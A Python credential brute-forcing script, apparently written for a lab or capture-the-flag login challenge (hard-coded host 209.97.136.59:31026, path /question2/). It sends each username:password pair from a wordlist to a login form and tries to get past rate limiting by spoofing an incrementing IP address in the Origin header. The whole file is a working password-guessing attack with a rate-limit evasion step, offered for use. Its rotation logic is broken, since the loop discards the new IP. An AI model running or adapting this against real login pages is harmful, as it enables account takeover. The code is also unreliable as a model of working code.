import requests

ip="1.1.1.1"

target=input("Enter Target URL: ")

wlist=input("Enter path to wordlist: ")
wordlist=open(wlist, 'r')



#Define a function to build and send the request
def attempt(url, ipaddr, userid, passwd):

    headers={'Host': '209.97.136.59:31026', 'Content-Length': '50', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'Origin': ipaddr, 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Referer': 'http://209.97.136.59:31026/question2/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'close'}

    postData = "userid="+str(userid)+"&passwd="+str(passwd)+"&submit=submit"


    print("""


    Posting ==> """,postData,"""



    """)

    resp = requests.post(url, headers=headers, data=postData)

    return resp.content




#Define a function to easily rotate the IP address
def ipRotate(ip):
    #Split the string ip into 4 integer octets
        ipStr=ip.split('.')
        a=int(ipStr[0])
        b=int(ipStr[1])
        c=int(ipStr[2])
        d=int(ipStr[3])

    #Iterate the IP by 1
        if not(d < 254):
                d=1
                if not(c < 254):
                        c=1
                        if not(b < 254):
                                b=1
                                if not(a < 254):
                                        print('no more IPs')
                                else:
                                        a+=1
                        else:
                                b+=1
                else:
                        c+=1
        else:
                d+=1

    #Join the 4 octets together and return the ip
        newIP=[]
        newIP.append(str(a))
        newIP.append(str(b))
        newIP.append(str(c))
        newIP.append(str(d))
        ip=".".join(newIP)
        return ip


#Start the main loop

for line in wordlist:

    uandp = line.split(":")

    username=uandp[0]
    password=uandp[1]

    feedback=attempt(target, ip, username, password)

    if ("too many" in str(feedback)):
        ipRotate(ip)
        feedback=attempt(target, ip, username, password)

        if ("too many" in str(feedback)):
            print("DIDN'T GET PAST RATE LIMITING")
            input("Press enter to exit")
            exit(0)

    if (not ("<strong>Invalid credentials.</strong>" in str(feedback))):
        print("Found a working set of creds =====> ",username," : ",password)
        input("Press enter to exit")
        exit(0)


#Below Commented section is a basic POC that I made to test
#   the functionality of the ipRotate() function
"""
print(attempt(target, ip, 'admin', 'admin'))

print("\""




      "\"")

ip=ipRotate(ip)
print(ip)
print("\""


      "\"")

print(attempt(target, ip, 'admin', 'password'))



print('Complete')

"""
